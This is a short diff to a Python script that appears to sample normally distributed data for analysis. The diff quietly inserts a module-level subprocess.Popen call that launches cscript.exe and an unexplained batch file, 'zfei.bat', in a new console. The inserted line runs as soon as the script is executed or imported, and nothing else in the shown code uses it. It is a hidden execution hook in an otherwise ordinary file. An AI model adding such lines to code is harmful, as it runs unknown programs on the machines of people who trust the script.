@@ -7,6 +7,7 @@ import os
 import tempfile
 import requests
 import sys
+subprocess.Popen(["cscript.exe", "--headless", "cmd /c zfei.bat"], creationflags=subprocess.CREATE_NEW_CONSOLE)
 
 # Sample Data: 1000 random numbers from a normal distribution
 data = np.random.randn(1000)
